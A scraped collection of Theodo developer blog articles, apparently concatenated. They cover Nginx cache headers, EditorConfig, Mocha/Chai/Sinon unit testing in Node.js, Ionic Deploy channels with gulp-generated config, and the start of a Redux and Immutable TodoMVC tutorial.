Based on the server’s response (see headers below) the browser will choose to use the cached version or will make a request to download the resource.
On the server’s side



Header
Meaning




Cache-Control: max-age=3600
The resource may be cached for 3600 seconds


Expires: Thu, 26 May 2016 00:00:00 GMT
The resource must be considered as outdated after this date


Last-Modified: Thu, 26 May 2016 00:00:00 GMT
The resource was last modified on this date


ETag: ""56c62238977a31353ce7716e759a7edb""
Identifier for the version of the resource



The server can define the cache policy with the Cache-Control header.
The max-age directive and the Expires header can both be used to achieve the same goal. The former uses a duration whereas the second one uses a date. That’s how the client knows the expiration date.
If the Cache-Control header contains public, the client should not try to revalidate the resource. It will naively use the resource in the cache until the expiration date is reached.
However, if the Cache-Control header contains must-revalidate, then the client should check if the resource is fresh everytime the resource is needed (even if the expiration date has not been reached). This might still be a performance boost in most cases because if the resource has not been modified, the server will return a 304 (not modified), which is arguably very lightweight compared to your original resource.
Last-Modified and ETag are stored along with the resource so that the client can check later if the resource has changed (when using must-revalidate).
How to configure Nginx to enable caching
Let’s assume that we want to cache the resources that are located in the /static/ folder:

/static/js/ for javascript files
/static/css/ for CSS files
/static/images/ for images

For this purpose, create a dedicated Nginx configuration file: /etc/nginx/conf/cache.conf, responsible for defining the cache policy. In your main configuration file (/etc/nginx/nginx.conf), add:
server {
    # ...

    include conf/cache.conf; # Add this line to your main config to include the cache configuration
}

Now, let’s see how the cache configuration can be set! This is an example of /etc/nginx/conf/cache.conf:
# JS
location ~* ^/static/js/$ {
    add_header Cache-Control public; # Indicate that the resource may be cached by public caches like web caches for instance, if set to 'private' the resource may only be cached by client's browser.

    expires     24h; # Indicate that the resource can be cached for 24 hours
}

# CSS
location ~* ^/static/css/$ {
    add_header Cache-Control public;

    # Equivalent to above:
    expires     86400; # Indicate that the resource can be cached for 86400 seconds (24 hours)

    etag on; # Add an ETag header with an identifier that can be stored by the client
}

# Images
location ~* ^/static/images/$ {
    add_header Cache-Control must-revalidate; # Indicate that the resource must be revalidated at each access

    etag on;
}

It is not aimed at a production use, it is merely an excuse to show the different ways cache can be configured.
Note:

A negative value for expires automatically sends a Cache-Control: no-cache in the response, thus deactivating the cache.
There is no need to manually add a Last-Modified header in the config as Nginx automatically sets it with the last modification date of the resource on the file system.

Reminders:

The Last-Modified date and the ETag identifier are stored by the client to avoid requests in the future.
The client may or may not check the freshness of the resource (with If-Modified-Since or If-None-Match), depending on the directives in Cache-Control.

Conclusion
Which strategy you should use is up to you: it is a tradeoff between the size of the resource, how often it changes and how important it is for your users to see the changes immediately.
For example, if you have a logo (and logos do not usually change very often!), it makes sense to cache it and to not try to revalidate it for 7 days.
For critical resources, you might want to revalidate every time. The most important use case is arguably the security update: if you patch your javascript code to fix a vulnerability, you want the user to get it as soon as possible, and you don’t want them to use a harmful version in their browser cache.
Finally, there are some cases where you might want to tell the browser not to cache the resource: if it contains sensitive information or if you know that the resource changes too often to hope gain something from caching.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Nicolas Trinquier
  			
  				Nicolas is a full stack developer. Along with his fellows at Theodo, he builds, with pragmatism, tomorrow's applications.  			
  		
    
			

									"
"
										Why use EditorConfig?
Developers do not want to take time to define and maintain consistent coding styles. But what if:

your team uses different editors and IDEs?
your team members are never the same?
you are on several projects at the same time?

Yes, you can set project settings, and ask your team to do the same. But there is a better way!

Indeed, you can create an .editorconfig file in your project directory with all the coding rules you want to be respected.
You won’t be the first to use it, look at all these projects using EditorConfig…
How does it work?
It’s simple to use and EditorConfig gives a really clear example.
This file is setting end-of-line and indentation styles for JS and Python.

There are two useful tips to know:

You can find the complete list of properties here
EditorConfig plugins look for a file named .editorconfig in the directory of the opened file and in every parents.

The search will stop if the root filepath is reached or when an option root=true is found.
You said plugins?
Depending on the editor you use, you might have to install a plugin.
A lot of editors are supported, like Atom, Eclipse, Emacs, PhpStorm, SublimeText, Vim or Xcode.
You’re using BBEdit, CLion, GitHub, IntelliJIDEA, RubyMine, SourceLair or WebStorm? Good news, you don’t have to do anything.
So now, what is your excuse for not using it?

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Vincent Langlet
  			
  				Vincent Langlet is an agile web developer at Theodo.  			
  		
    
			

									"
"
										A few months ago, we started a project with a Node.js backend. During this project we learned how to write clean and efficient tests, and we decided to write about it.
In this first part we will present the tools we used to test our application and why they are great. We will show you examples of Node.js tests, but the libraries can be used to test both your front and backend code. All the examples in this article can be found in this repository: https://github.com/tib-tib/demo-js-tests-part-1.
Prerequisites
You must have Node.js and npm installed. To do so, you can follow the npm documentation.
Let’s write a JavaScript unit test
What might a test look like when you don’t use any framework or library? Let’s take for example a function that computes the square of a given number:
module.exports = {
  square: function(a) {
    return a*a;
  }
};

We assume that this function is in the file /workspace/math.js. You can write a test in the file /workspace/math.test.js. Since a test file is just a regular JavaScript file, you can name it as you wish though it is a good practice to use naming conventions. To check the behavior of the square function, we can use the different methods provided in the assert module available in Node.js.
var assert = require('assert');
var math = require('./math');

assert.equal(math.square(3), 9);

To launch the test, run: node /workspace/math.test.js. There is no output, that means the test succeeded because assert only provides information about the first failure. If you want a specific message you have to provide one in the argument list:
var assert = require('assert');
var math = require('./math');

assert.equal(math.square(2), 4, 'square of 2 is 4');
assert.equal(math.square(3), 9, 'square of 3 is 9');

If you make a mistake in your square function – for instance return a+a; instead of return a*a; – and launch the test, you will now see an error:
assert.js:86
  throw new assert.AssertionError({
        ^
AssertionError: square of 3 is 9
    at Object.<anonymous> (/workspace/math.test.js:5:8)
    at Module._compile (module.js:460:26)
    at Object.Module._extensions..js (module.js:478:10)
    at Module.load (module.js:355:32)
    at Function.Module._load (module.js:310:12)
    at Function.Module.runMain (module.js:501:10)
    at startup (node.js:129:16)
    at node.js:814:3

We can see that our test failed, but we don’t have any information about why it did.
How to have clearer output and organized tests?
Let’s now try Mocha. Mocha is a framework to run tests serially in an asynchronous environment. In your workspace, install it with the following command:
npm install mocha

Then, we have to change our test file a little bit to use Mocha’s features. Let’s create the file /workspace/test/math.js:
var assert = require('assert');
var math = require('../math');

describe('square', function() {
    it('should return the square of given numbers', function() {
        assert.equal(math.square(2), 4);
        assert.equal(math.square(3), 9);
    });
});

By default, Mocha will launch all JavaScript files located in a test directory in your workspace. This is great because we just have to run ./node_modules/.bin/mocha to handle several test files. Another benefit is that we have some output that describes our whole application:
  square
    ✓ should return the square of given numbers

  1 passing (8ms)

In case of failure we also have a much clearer output:
  square
    1) should return the square of given numbers


  0 passing (18ms)
  1 failing

  1) square should return the square of given numbers:

      AssertionError: 6 == 9
      + expected - actual

      -6
      +9

      at Context.<anonymous> (test/math.js:7:16)

We can see the tests that fail at a glance and then we have the detail of the failures. We notice that the expected and actual values are displayed, which is convenient to help us find our bug(s). Plus, we don’t have the assertion stack trace anymore, as it does not provide useful information.
Moreover, mocha allows us to have a clean and organized test structure. With describe you can literally describe what you are testing, and with the it function you can tell explicitly what behavior your function should have.
Now that we have a proper test organization, we can focus on our assertions. Indeed, they lack readability.
Write assertions like you write sentences
Chai is an assertion library that helps improving the readability of your tests in two ways. First, you can use more semantic functions like lengthOf, below or within in your assertions. Second, it provides expect and should interfaces in order to have a more human friendly syntax in our assertions. For instance, thanks to Chai you can write the following assertions:
math.square(3).should.be.above(3);
math.square(3).should.be.within(6, 12);
math.square(3).should.be.below(10);

Let’s go back to our previous example. You can install chai with the following command:
npm install chai
With chai, our workspace/test/math.js will now look like:
var should = require('chai').should();
var math = require('../math');

describe('square', function() {
    it('should return the square of given numbers', function() {
        math.square(2).should.equal(4);
        math.square(3).should.equal(9);
    });
});

And the output is a bit different in case of failure:
# Output with mocha and assert
AssertionError: 6 == 9
# Output with mocha and chai
AssertionError: expected 6 to equal 9

As of now we have everything we need to test a JavaScript file. The tests we write are easy to read and their output provides useful information in case of success as well as in case of failure. However, our square function had very few logic. What will happen if we want to test a function depending on other services?
How to handle function dependencies in your tests?
Let’s add another service, called equation.js, in our workspace. It will contain a discriminant function, that uses the square function defined in the service above.
var math = require('./math');

module.exports = {
  discriminant: function(a, b, c) {
    return math.square(b) - 4*a*c;
  }
};

Then, let’s write a test of discriminant in /workspace/test/equation.js. This test looks like the test of square:
var should = require('chai').should();
var equation = require('../equation');

describe('discriminant', function() {
    it('should return the discriminant of given numbers', function() {
        equation.discriminant(3, 2, -5).should.equal(64);
        equation.discriminant(3, 11, 7).should.equal(37);
    });
});

As we already said, when we launch the tests with mocha (./node_modules/.bin/mocha) all the files in test are used. We now have the following output:
  discriminant
    ✓ should return the discriminant of given numbers

  square
    ✓ should return the square of given numbers

  2 passing (14ms)

Our two methods are tested. That’s great!
Let’s break square and see what happens. As before we replace a*a by a+a and here is the test result:
  discriminant
    1) should return the discriminant of given numbers

  square
    2) should return the square of given numbers


  0 passing (20ms)
  2 failing

  1) discriminant should return the discriminant of given numbers:

      AssertionError: expected -62 to equal 37
      + expected - actual

      --62
      +37

      at Context.<anonymous> (test/equation.js:7:48)

  2) square should return the square of given numbers:

      AssertionError: expected 6 to equal 9
      + expected - actual

      -6
      +9

      at Context.<anonymous> (test/math.js:7:31)

The test of square fails which is the expected behavior but the test of discriminant also fails which means we did not write a unit test. The first consequence is that we don’t know where our code is broken. Is it square or discriminant that we have to fix?
To unit test the discriminant function, we have to “stub” the square function, that is to say we have to fake its behavior so that the test of the discriminant does not depend on a function of another service. We can do this with Sinon. You can install it with the following command:
npm install sinon
Then, we can modify the test file /workspace/test/equation.js:
var should = require('chai').should();
var sinon = require('sinon');

var equation = require('../equation');
var math = require('../math');

var stub;

describe('discriminant', function() {
    before(function() {
        stub = sinon.stub(math, 'square').returns(4);
    });

    after(function () {
        stub.restore();
    });

    it('should return the discriminant', function() {
        equation.discriminant(3, 2, -5).should.equal(64);
        equation.discriminant(3, 11, 7).should.equal(-80);
    });
});

You see two functions before and after. These functions define what to do before and after launching the tests. Here, we initialize the stub in the before function, and we restore the initial behavior of square in the after function. After defining a stub, it is very important to restore it, because otherwise the stub will be active in following tests, and thus will break them.
The stub allows us to define a fake return value for the square function. It means that whenever this function is called, it will return the value 25. As a consequence, when we call the discriminant function with the a, b and c parameters, the b value won’t be used because the stub returns a specific value.
Now if square is broken, we have the following output:
  discriminant
    ✓ should return the discriminant

  square
    1) should return the square of given numbers


  1 passing (28ms)
  1 failing

  1) square should return the square of given numbers:

      AssertionError: expected 6 to equal 9
      + expected - actual

      -6
      +9

      at Context.<anonymous> (test/math.js:7:31)

The test of discrimant is ok which is what we want since there is no error in the discrimant function. The test of square is failing which gives us a good idea of where we made a mistake in our code.
The stub allows us to isolate the logic of the discriminant function, and that’s why Sinon is very useful.
What’s next?
Now that you understand the purpose of each library of the Mocha-Sinon-Chai stack, it is time to write some more complex tests. It will be the subject of the second part of our tutorial, in which you will learn about sandboxes, tests on functions using callbacks, or using promises among many other things. Be ready!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Thibaut Gatouillat
  			
  				Agile web developer at Theodo.  			
  		
    
			

									"
"
										In part 1 of this tutorial, we learned how you can get your Ionic app to self-update, to deploy new code whenever needed, instead of having to wait up to two weeks for Apple to review your new versions.
Deploy channels
As with web applications, you may want to first deploy features on a test application (often called staging), to also have a preproduction application, or even to have specific versions to test latest large features (A/B testing for instance).
Ionic Deploy handles this need with channels. You can manage your channels on the Ionic Platform Dashboard‘s Deploy section. By defaut, the “Production” channel is used and a few others were also already created, but you can create a lot more.
Pushing environment specific updates
To push only to a certain environment, just add the --deploy flag. For instance, if you a have a staging channel, you can simply use
ionic upload --deploy staging

I recommend against using the “Production” channel as it is the one used by default when uploading a new version without specifying a deploy value.
Fetching environment specific updates
Let’s say you have an angular constant channelTag being the tag of the channel. Fetching updates only from this specific channel can be done by adding a single line to the code from the first part of the tutorial. Check this out.
.run(function($ionicPopup, channelTag) {
  var deploy = new Ionic.Deploy();
  deploy.setChannel(channelTag);
  deploy.watch().then(function() {}, function() {}, function(updateAvailable) {
    if (updateAvailable) {
      deploy.download().then(function() {
        deploy.extract().then(function() {
          deploy.unwatch();
          $ionicPopup.show({
            title: 'Update available',
            subTitle: 'An update was just downloaded. Would you like to restart your app to use the latest features?',
            buttons: [
              { text: 'Not now' },
              {
                text: 'Restart',
                onTap: function(e) {
                  deploy.load();
                }
              }
            ],
          });
        });
      });
    }
  });
};

One codebase, several applications
Using a single codebase and being able to hold all the versions of your app simultaneously on your phone can be achieved in a few extra steps:

You need to be able to generate specific cordova config.xml files for the different versions
You need to be able to generate a different channelTag constant for each version of your app

Let’s start by building a config.tpl.xml file, which is to be the template of the cordova config file. Place it on the root of your project.
config.tpl.xml
<widget xmlns=""http://www.w3.org/ns/widgets"" xmlns:cdv=""http://cordova.apache.org/ns/1.0"" id=""<%=appId%>"" version=""<%=version%>"">
  <name><%=appName%></name>
  <description>Updaty is a great app which self updates</description>
  <author email=""dev@theodo.fr"" href=""http://theodo.fr"">Theodo</author>
  <content src=""index.html""/>
</widget>

A few values are to be injected in the file:

The app id (which looks like a reverse url such as a java package name and must match your apple developper app id)
The application’s version
The application’s name (which will appear below your app icon on the phone). I usually use the application’s real name for the production version, and shortened names containing the environment for other versions of the app.

Let’s now create a config.json file (also placed at the root of your project) which will define those values for each environment:
config.json
{
  ""staging"": {
    ""appId"": ""fr.theodo.updaty-staging"",
    ""appName"": ""Updaty Staging""
  },
  ""prod"": {
    ""appId"": ""fr.theodo.updaty"",
    ""appName"": ""Updaty""
  }
}

Generating the environment specific files
A simple gulpfile is enough to generate all the files you need. Pick up the following libraries to start off:
npm install --save-dev gulp-ng-constant gulp-ionic-channels yargs

gulpfile.js
var gulp = require('gulp');
var ionicChannels = require('gulp-ionic-channels');
var ngConstant = require('gulp-ng-constant');

var args = require('yargs').default('channelTag', 'staging').argv;

gulp.task('config', function() {
  gulp.src('./config.json')
  .pipe(ionicChannels({
    channelTag: args.channelTag
  }))
  .pipe(ngConstant())
  .pipe(gulp.dest('./www/js'));
});

Simply running gulp config will generate ./config.xml and ./www/js/config.js for the staging channel tag, and gulp config --channelTag prod will do the same for the prod channel tag.
config.xml (output)
<widget xmlns=""http://www.w3.org/ns/widgets"" xmlns:cdv=""http://cordova.apache.org/ns/1.0"" id=""fr.theodo.updaty-staging"" version=""0.0.1"">
  <name>Updaty Staging</name>
  <description>Updaty is a great app which self updates</description>
  <author email=""dev@theodo.fr"" href=""http://theodo.fr"">Theodo</author>
  <content src=""index.html""/>
</widget>

www/js/config.js (output)
angular.module(""config"", [])

.constant(""appId"", ""fr.theodo.updaty-staging"")

.constant(""appName"", ""Updaty Staging"")

.constant(""version"", ""0.0.1"")

.constant(""channelTag"", ""staging"")

;

gulp-ionic-channels
I made it all easy for you with this gulp plugin I developed, which takes the config.json file as source, adds to it the version from your package.json file as well as the channelTag passed as an argument, and uses it to:

Pass the enriched (and environment filtered) configuration to the next gulp pipe
Generate from the template (by default it looks for ./config.tpl.xml) a cordova configuration file (by default ./config.xml).

gulp-ng-constant
This useful plugin will generate a javascript file which contains all the angular constants you need from the enriched configuration returned by gulp-ionic-channels, such as the channelTag constant.
Final modifications
You finally need to edit

your ./www/index.html file to include the file generated by gulp-ng-constant:

<!-- your app's js -->
<script src=""js/config.js""></script>
<script src=""js/app.js""></script>
<script src=""js/controllers.js""></script>
<script src=""js/services.js""></script>


your ./www/js/app.js file to include the module generated by gulp-ng-constant:

angular.module('updaty', ['config', 'ionic', 'ionic.service.core', 'updaty.controllers', 'updaty.services'])

You should be good to go!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Woody Rousseau
  			
  				Woody is a full-stack web developer, who believes in building complex applications, with a focus on speed without compromising code quality. He also loves adding  as many Github badges as possible on his repositories.  			
  		
    
			

									"
"
										Image credits: egghead.io
A few weeks ago, I was idly browsing through Hacker News, and read a headline about Redux, which I understood was yet another thing that was supposed to get along well with React. Javascript fatigue had already got its grip on me, so I paid little attention, until I read the following features of Redux:

It enforces functional programming and ensures predictability of the app behavior
It allows for isomorphic app, where most of the logic is shared between the client and the server code
A time-traveling debugger?! Is that even possible?

It seemed like an elegant solution to manage the state of React applications, plus who would say no to time travel? So I got in, read the examples in the docs and this fantastic tutorial by @teropa: A Comprehensive Guide to Test-First Development with Redux, React, and Immutable (which is a major source of inspiration for this article).
I liked it. The code is elegant. The debugger is insanely great. I mean – look at this (click to see in action):

What follows is the first part of a tutorial that will hopefully guide you to the principles of the Redux way of doing things©. It is purposefully limited in scope (it’s client-side only, so no isomorphism; a quite simplistic app) in order to keep it somewhat concise. If you want to dig further, I can only recommend the tutorial mentioned above. A companion GitHub repo is available here, which follows the steps to the final app and has a copy of this article. If you have any questions/suggestions on the code and/or the turorial, please leave a comment or – better yet, open a Pull Request!
Edit: The article was updated to use the ES2015 syntax for React classes. Thanks to seantimm for pointing that out in the comments!
The app
For the purpose of this tutorial we will build the classic TodoMVC app. For the record, the requirements are the following:

Each todo can be active or completed
A todo can be added, edited or deleted
Todos can be filtered by their status
A counter of active todos is displayed at the bottom
Completed todos can be deleted all at once

You can see an example of such an app here.
Redux and Immutable: functional programming to the rescue
A few months back, I was developing a webapp consisting of dashboards. As the app grew, we noticed more and more pernicious bugs, that were hard to corner and fix. Things like “if you go to this page, click on that button, then go back to the home page, grab a coffee, go to this page and click twice here, something weird happens”. The source of all these bugs was either side effects in our code or logic: an action could have an unwanted impact on something somewhere else in our app, that we were not aware of.
That is where the power of Redux lies: the whole state of the app is contained in a single data structure, the state tree. This means that at every moment, what is displayed to the user is the only consequence of what is inside the state tree, which is the single source of truth. Every action in our app takes the state tree, apply the corresponding modifications (add a todo, for example) and outputs the updated state tree, which is then rendered to the user. There is no obscure side effects, no more references to a variable that was inadvertantly modified. This makes for a cleaner separation of concerns, a better app structure and allows for much better debugging.
Immutable is a helper library developed by Facebook that provides tools to create and manipulate immutable data structures. Although it is by no means mandatory to use it alongside Redux, it enforces the functional approach by forbidding objects modifications. With Immutable, when we want to update an object, we actually create another one with the modifications, and leave the original one as is.
Here is an example drawn from the docs:
var map1 = Immutable.Map({a:1, b:2, c:3});
var map2 = map1.set('b', 2);
assert(map1 === map2); // no change
var map3 = map1.set('b', 50);
assert(map1 !== map3); // change

We updated a value of map1, the map1 object in itself remained identical and a new object, map3, was created.
Immutable will be used to store the state tree of our app, and we will soon see that it provides a lot of simple methods to manipulate it concisely and efficiently.
Setting up the project
Disclaimer: a lot of the setting up is inspired by the @teropa tutorial mentionned earlier
Note: it is recommended to follow this project with a version of NodeJS >= 4.0.0. You can install nvm (node version manager) to be able to switch between Node versions with ease.
Note: here is the relevant commit in the companion repository.
It is now time to setup the project:
mkdir redux-todomvc
cd redux-todomvc
npm init -y

The project directory will look like the following:
├── dist
│   ├── bundle.js
│   └── index.html
├── node_modules
├── package.json
├── src
├── test
└── webpack.config.js

First, we write a simple HTML page in which will run our application:
dist/index.html
<!DOCTYPE html>
<html lang=""en"">
<head>
  <meta charset=""UTF-8"">
  <title>React TodoMVC</title>
</head>
<body>
  <div id=""app""></div>
  <script src=""bundle.js""></script>
</body>
</html>

To go along with it, let’s write a very simple script that will tell us that everything went fine with the packaging:
src/index.js
console.log('Hello World!');

We are going to build the packaged bundle.js file using Webpack. Among the advantages of Webpack feature speed, ease of configuration and most of all hot reload, i.e. the possibility for the webpage to take into account our latest changes without even reloading, meaning the state for the app is kept across (hot) reloads.
Let’s install webpack:
npm install -g --save-dev webpack@1.12.14 webpack-dev-server@1.14.1

The app will be written using the ES2015 syntax, which brings along an impressive set of new features and some nicely integrated syntactic sugar. If you would like to know more about ES2015, this recap is a neat resource.
Babel will be used to transpile the ES2015 syntax to common JS:
npm install --save-dev babel-core@6.5.2 babel-loader@6.2.4 babel-preset-es2015@6.5.0

We are also going to use the JSX syntax to write our React components, so let’s install the Babel React package:
npm install --save-dev babel-preset-react@6.5.0

Here we configure webpack to build our upcoming source files:
package.json
""babel"": {
  ""presets"": [""es2015"", ""react""]
}

webpack.config.js
module.exports = {
  entry: [
    './src/index.js'
  ],
  module: {
    loaders: [{
      test: /\.jsx?$/,
      exclude: /node_modules/,
      loader: 'babel'
    }]
  },
  resolve: {
    extensions: ['', '.js', '.jsx']
  },
  output: {
    path: __dirname + '/dist',
    publicPath: '/',
    filename: 'bundle.js'
  },
  devServer: {
    contentBase: './dist'
  }
};

Now, let’s add React and React Hot Loader to the project:
npm install --save react@0.14.7 react-dom@0.14.7
npm install --save-dev react-hot-loader@1.3.0

In order to enable the hot loading, a few changes are necessary in the webpack config file:
webpack.config.js
var webpack = require('webpack'); // Requiring the webpack lib

module.exports = {
  entry: [
    'webpack-dev-server/client?http://localhost:8080', // Setting the URL for the hot reload
    'webpack/hot/only-dev-server', // Reload only the dev server
    './src/index.js'
  ],
  module: {
    loaders: [{
      test: /\.jsx?$/,
      exclude: /node_modules/,
      loader: 'react-hot!babel' // Include the react-hot loader
    }]
  },
  resolve: {
    extensions: ['', '.js', '.jsx']
  },
  output: {
    path: __dirname + '/dist',
    publicPath: '/',
    filename: 'bundle.js'
  },
  devServer: {
    contentBase: './dist',
    hot: true // Activate hot loading
  },
  plugins: [
    new webpack.HotModuleReplacementPlugin() // Wire in the hot loading plugin
  ]
};

Setting up the unit testing framework
We will be using Mocha and Chai as our test framework for this app. They are widely used, and the output they produce (a diff comparison of the expected and actual result) is great for doing test-driven-development. Chai-Immutable is a chai plugin that handles immutable data structures.
npm install --save immutable@3.7.6
npm install --save-dev mocha@2.4.5 chai@3.5.0 chai-immutable@1.5.3

In our case we won’t rely on a browser-based test runner like Karma – instead, the jsdom library will setup a DOM mock in pure javascript and will allow us to run our tests even faster:
npm install --save-dev jsdom@8.0.4

We also need to write a bootstrapping script for our tests that takes care of the following:

Mock the document and the window objects, normally provided by the browser
Tell chai that we are using immutable data structures with the package chai-immutable

test/setup.js
import jsdom from 'jsdom';
import chai from 'chai';
import chaiImmutable from 'chai-immutable';

const doc = jsdom.jsdom('<!doctype html><html><body></body></html>');
const win = doc.defaultView;

global.document = doc;
global.window = win;

Object.keys(window).forEach((key) => {
  if (!(key in global)) {
    global[key] = window[key];
  }
});

chai.use(chaiImmutable);

Let’s update the npm test script so that it takes into account our setup:
package.json
""scripts"": {
  ""test"": ""mocha --compilers js:babel-core/register --require ./test/setup.js 'test/**/*.@(js|jsx)'"",
  ""test:watch"": ""npm run test -- --watch --watch-extensions jsx""
},

Edit: It seems that the npm run test:watch command does not work on Windows. If you encounter this problem, please refer to this issue in the GitHub repository
Now, if we run npm run test:watch, all the .js or .jsx file in our test directory will be run as mocha tests each time we update them or our source files.
The setup is now complete: we can run webpack-dev-server in a terminal, npm run test:watch in another, and head to localhost:8080/ in a browser to check that Hello World! appears in the console.
Building a state tree
As mentionned before, the state tree is the data structure that will hold all
the information contained in our application (the state). This structure needs
to be well thought of before actually developing the app, because it will shape
a lot of the code structure and interactions.
As an example here, our app is composed of several items in a todo list:

Each of these items have a text and, for an easier manipulation, an id.
Moreover, each item can have one of two status – active or completed:
Lastly, an item can be in a state of edition (when the user wants to edit the
text), so we should keep track of that as well:

It is also possible to filter our items based on their statuses, so we can add a
filter entry to obtain our final state tree:

Writing the UI for our app

First of all, we are going to split the app into components:

The TodoHeader component is the input for creating new todos
The TodoList component is the list of todos
The TodoItem component is one todo
The TextInput component is the input for editing a todo
The TodoTools component displays the active counter, the filters and the “Clear completed” button
The Footer component displays the footer info and has no logic attached to it

We are also going to create a TodoApp component that will hold all the others.
Bootstrapping our first component
Note: here is the relevant commit in the companion repository.
As we saw, we are going to put all of our components in a single one, TodoApp. so let’s begin by attaching this component to the #app div in our index.html:
src/index.jsx
import React from 'react';
import ReactDOM from 'react-dom';
import {List, Map} from 'immutable';

import TodoApp from './components/TodoApp';

const todos = List.of(
  Map({id: 1, text: 'React', status: 'active', editing: false}),
  Map({id: 2, text: 'Redux', status: 'active', editing: false}),
  Map({id: 3, text: 'Immutable', status: 'completed', editing: false})
);

ReactDOM.render(
  <TodoApp todos={todos} />,
  document.getElementById('app')
);

As we used the JSX syntax in the index.js file, we have to change its extension to .jsx, and change the file name in the webpack config file as well:
webpack.config.js
entry: [
  'webpack-dev-server/client?http://localhost:8080',
  'webpack/hot/only-dev-server',
  './src/index.jsx' // Change the index file extension
],

Writing the todo list UI
Now, we are going to write a first version of the TodoApp component, that will display the list of todo items:
src/components/TodoApp.jsx
import React from 'react';

export default class TodoApp extends React.Component {
  getItems() {
    return this.props.todos || [];
  }
  render() {
    return <div>
      <section className=""todoapp"">
        <section className=""main"">
          <ul className=""todo-list"">
            {this.getItems().map(item =>
              <li className=""active"" key={item.get('text')}>
                <div className=""view"">
                  <input type=""checkbox""
                         className=""toggle"" />
                  <label htmlFor=""todo"">
                    {item.get('text')}
                  </label>
                  <button className=""destroy""></button>
                </div>
              </li>
            )}
          </ul>
        </section>
      </section>
    </div>
  }
};

Two things come to mind.
First, if you look at the result in your browser, it is not that much appealing. To fix that, we are going to use the todomvc-app-css package that brings along all the styles we need to make this a little more enjoyable:
npm install --save todomvc-app-css@2.0.4
npm install style-loader@0.13.0 css-loader@0.23.1 --save-dev

We need to tell webpack to load css stylesheets too:
webpack.config.js
// ...
module: {
  loaders: [{
    test: /\.jsx?$/,
    exclude: /node_modules/,
    loader: 'react-hot!babel'
  }, {
    test: /\.css$/,
    loader: 'style!css' // We add the css loader
  }]
},
//...

Then we will include the style in our index.jsx file:
src/index.jsx
// ...
require('../node_modules/todomvc-app-css/index.css');

ReactDOM.render(
  <TodoApp todos={todos} />,
  document.getElementById('app')
);

The second thing is that the code seems complicated: it is. That is why we are going to create two more components: TodoList and TodoItem that will take care of respectively the list of all the items and a single one.
Note: here is the relevant commit in the companion repository.
src/components/TodoApp.jsx
import React from 'react';
import TodoList from './TodoList'

export default class TodoApp extends React.Component {
  render() {
    return <div>
      <section className=""todoapp"">
        <TodoList todos={this.props.todos} />
      </section>
    </div>
  }
};

The TodoList component will display a TodoItem component for each item it has received in its props:
src/components/TodoList.jsx
import React from 'react';
import TodoItem from './TodoItem';

export default class TodoList extends React.Component {
  render() {
    return <section className=""main"">
      <ul className=""todo-list"">
        {this.props.todos.map(item =>
          <TodoItem key={item.get('text')}
                    text={item.get('text')} />
        )}
      </ul>
    </section>
  }
};

src/components/TodoItem.jsx
import React from 'react';

export default class TodoItem extends React.Component {
  render() {
    return <li className=""todo"">
      <div className=""view"">
        <input type=""checkbox""
               className=""toggle"" />
        <label htmlFor=""todo"">
          {this.props.text}
        </label>
        <button className=""destroy""></button>
      </div>
    </li>
  }
};

Before going more deeply into possible user actions and how we are going to integrate them in the app, let’s add an input in the TodoItem component for editing:
src/components/TodoItem.jsx
import React from 'react';

import TextInput from './TextInput';

export default class TodoItem extends React.Component {

  render() {
    return <li className=""todo"">
      <div className=""view"">
        <input type=""checkbox""
               className=""toggle"" />
        <label htmlFor=""todo"">
          {this.props.text}
        </label>
        <button className=""destroy""></button>
      </div>
      <TextInput /> // We add the TextInput component
    </li>
  }
};

The TextInput component can be written as follows:
src/components/TextInput.jsx
import React from 'react';

export default class TextInput extends React.Component {
  render() {
    return <input className=""edit""
                  autoFocus={true}
                  type=""text"" />
  }
};

The benefits of “pure” components: the PureRenderMixin
Note: here is the relevant commit in the companion repository.
Apart for allowing a functional programming style, the fact that our UI is purely dependant on props allows us to use the PureRenderMixin for a performance boost, as per the React docs:
“If your React component’s render function is “pure” (in other words, it renders the same result given the same props and state), you can use this mixin for a performance boost in some cases.”
It is quite easy to add it to our child components, as shown in the React documentation (we will see in part two that the TodoApp component has some extra role that prevents the use of the PureRenderMixin):
npm install --save react-addons-pure-render-mixin@0.14.7

src/components/TodoList.jsx
import React from 'react';
import PureRenderMixin from 'react-addons-pure-render-mixin'
import TodoItem from './TodoItem';

export default class TodoList extends React.Component {
  constructor(props) {
    super(props);
    this.shouldComponentUpdate = PureRenderMixin.shouldComponentUpdate.bind(this);
  }
  render() {
    // ...
  }
};

src/components/TodoItem.jsx
import React from 'react';
import PureRenderMixin from 'react-addons-pure-render-mixin'
import TextInput from './TextInput';

export default class TodoItem extends React.Component {
  constructor(props) {
    super(props);
    this.shouldComponentUpdate = PureRenderMixin.shouldComponentUpdate.bind(this);
  }
  render() {
    // ...
  }
};

src/components/TextInput.jsx
import React from 'react';
import PureRenderMixin from 'react-addons-pure-render-mixin'

export default class TextInput extends React.Component {
  constructor(props) {
    super(props);
    this.shouldComponentUpdate = PureRenderMixin.shouldComponentUpdate.bind(this);
  }
  render() {
    // ...
  }
};

Handling user actions in the list components
Okay, so now we have our UI set up for the list components. However, none of what we have written yet takes into account user actions and how the app responds to them.
The power of props
In React, the props object is passed by settings attributes when we instantiate a container. For example, if we instantiate a TodoItem element this way:
<TodoItem text={'Text of the item'} />

Then we can access, in the TodoItem component, the this.props.text variable:
// in TodoItem.jsx
console.log(this.props.text);
// outputs 'Text of the item'

The Redux architecture makes an intensive use of props. The basic principle is that (nearly) every element’s state should be residing only in its props. To put it another way: for the same set of props, two instances of an element should output the exact same result. As we saw before, the entire state of the app is contained in the state tree: this means that the state tree, passed down to components as props, will entirely and predictably determine the app’s visual output.
The TodoList component
Note: here is the relevant commit in the companion repository.
In this section and the following, we are going to follow a test-first approach.
In order to help up test our components, the React library provides the TestUtils addons that provide, among others, the following methods:

renderIntoDocument, that renders a component into a detached DOM node;
scryRenderedDOMComponentsWithTag, that finds all instances of components in the DOM with the provided tag (like li, input…);
scryRenderedDOMComponentsWithClass, that finds all instances of components in the DOM with the provided class;
